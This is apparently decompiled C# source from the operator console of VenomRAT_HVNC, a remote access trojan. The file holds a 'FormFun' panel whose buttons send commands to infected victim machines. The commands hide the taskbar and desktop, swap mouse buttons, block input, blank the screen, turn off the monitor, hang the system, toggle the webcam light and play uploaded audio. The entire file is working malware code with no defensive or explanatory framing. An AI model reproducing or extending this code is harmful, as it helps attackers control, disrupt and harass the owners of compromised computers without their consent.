using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000070 RID: 112
    public partial class FormFun : Form
    {
        // Token: 0x06000417 RID: 1047 RVA: 0x00023405 File Offset: 0x00023405
        public FormFun()
        {
            this.InitializeComponent();
        }

        // Token: 0x170000C1 RID: 193
        // (get) Token: 0x06000418 RID: 1048 RVA: 0x00023413 File Offset: 0x00023413
        // (set) Token: 0x06000419 RID: 1049 RVA: 0x0002341B File Offset: 0x0002341B
        public Form1 F { get; set; }

        // Token: 0x170000C2 RID: 194
        // (get) Token: 0x0600041A RID: 1050 RVA: 0x00023424 File Offset: 0x00023424
        // (set) Token: 0x0600041B RID: 1051 RVA: 0x0002342C File Offset: 0x0002342C
        internal Clients Client { get; set; }

        // Token: 0x170000C3 RID: 195
        // (get) Token: 0x0600041C RID: 1052 RVA: 0x00023435 File Offset: 0x00023435
        // (set) Token: 0x0600041D RID: 1053 RVA: 0x0002343D File Offset: 0x0002343D
        internal Clients ParentClient { get; set; }

        // Token: 0x0600041E RID: 1054 RVA: 0x00023448 File Offset: 0x00023448
        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
            }
        }

        // Token: 0x0600041F RID: 1055 RVA: 0x00023494 File Offset: 0x00023494
        private void button1_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000420 RID: 1056 RVA: 0x000234DC File Offset: 0x000234DC
        private void button2_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000421 RID: 1057 RVA: 0x00023524 File Offset: 0x00023524
        private void button3_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000422 RID: 1058 RVA: 0x0002356C File Offset: 0x0002356C
        private void button4_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000423 RID: 1059 RVA: 0x000235B4 File Offset: 0x000235B4
        private void button5_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000424 RID: 1060 RVA: 0x000235FC File Offset: 0x000235FC
        private void button6_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000425 RID: 1061 RVA: 0x00023644 File Offset: 0x00023644
        private void button8_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000426 RID: 1062 RVA: 0x0002368C File Offset: 0x0002368C
        private void button7_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000427 RID: 1063 RVA: 0x000236D4 File Offset: 0x000236D4
        private void button10_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000428 RID: 1064 RVA: 0x0002371C File Offset: 0x0002371C
        private void button9_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000429 RID: 1065 RVA: 0x00023764 File Offset: 0x00023764
        private void button18_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042A RID: 1066 RVA: 0x000237AC File Offset: 0x000237AC
        private void button17_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042B RID: 1067 RVA: 0x000237F4 File Offset: 0x000237F4
        private void button11_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
            msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042C RID: 1068 RVA: 0x0002385C File Offset: 0x0002385C
        private void button15_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
            msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042D RID: 1069 RVA: 0x000238C4 File Offset: 0x000238C4
        private void button12_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042E RID: 1070 RVA: 0x0002390C File Offset: 0x0002390C
        private void button14_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x0600042F RID: 1071 RVA: 0x000067A9 File Offset: 0x000067A9
        private void button13_Click(object sender, EventArgs e)
        {
        }

        // Token: 0x06000430 RID: 1072 RVA: 0x00023951 File Offset: 0x00023951
        private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate (object o)
            {
                Clients client = this.Client;
                if (client == null)
                {
                    return;
                }
                client.Disconnected();
            });
        }

        // Token: 0x06000431 RID: 1073 RVA: 0x00023968 File Offset: 0x00023968
        private void button19_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000432 RID: 1074 RVA: 0x000239B0 File Offset: 0x000239B0
        private void button16_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        // Token: 0x06000433 RID: 1075 RVA: 0x000239F8 File Offset: 0x000239F8
        private void button13_Click_1(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "(*.wav)|*.wav";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    byte[] asBytes = File.ReadAllBytes(openFileDialog.FileName);
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
                    msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
                else
                {
                    MessageBox.Show("Please choose a wav file.");
                }
            }
        }
    }
}